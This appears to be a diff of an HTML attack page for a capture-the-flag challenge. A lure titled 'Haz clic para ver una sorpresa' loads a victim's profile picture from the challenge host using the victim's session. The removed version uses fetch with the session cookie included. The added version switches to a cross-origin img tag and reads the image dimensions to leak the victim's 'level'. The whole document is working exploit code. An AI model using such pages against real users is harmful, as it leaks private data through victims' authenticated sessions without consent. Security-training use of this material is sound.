@@ -6,31 +6,25 @@
 <body>
     <h1>Haz clic para ver una sorpresa</h1>
     <div id="resultado"></div>
+    <img id="profilePic" style="display:none;" alt="Profile Picture">
     <script>
-        // Solicitud a /profile-pic para obtener la imagen de Pepe
-        fetch('https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/profile-pic', {
-            method: 'GET',
-            credentials: 'include' // Incluye la cookie de sesión de Pepe
-        })
-        .then(response => response.blob())
-        .then(blob => {
-            const img = new Image();
-            img.src = URL.createObjectURL(blob);
-            img.onload = () => {
-                const width = img.width;
-                const height = img.height;
-                const level = width * height;
-                // Mostrar las dimensiones y el nivel en el HTML
-                document.getElementById('resultado').innerHTML = `
-                    <p>Ancho: ${width}px</p>
-                    <p>Alto: ${height}px</p>
-                    <p>Nivel de Pepe: ${level}</p>
-                `;
-            };
-        })
-        .catch(error => {
-            document.getElementById('resultado').innerHTML = `<p>Error: ${error.message}</p>`;
-        });
+        const img = document.getElementById('profilePic');
+        img.src = 'https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/profile-pic';
+
+        img.onload = () => {
+            const width = img.naturalWidth;
+            const height = img.naturalHeight;
+            const level = width * height;
+            document.getElementById('resultado').innerHTML = `
+                <p>Ancho: ${width}px</p>
+                <p>Alto: ${height}px</p>
+                <p>Nivel de Pepe: ${level}</p>
+            `;
+        };
+
+        img.onerror = (error) => {
+            document.getElementById('resultado').innerHTML = `<p>Error al cargar la imagen: ${error.message || 'No se pudo acceder a la imagen. Verifica que estás logueado.'}</p>`;
+        };
     </script>
 </body>
 </html>
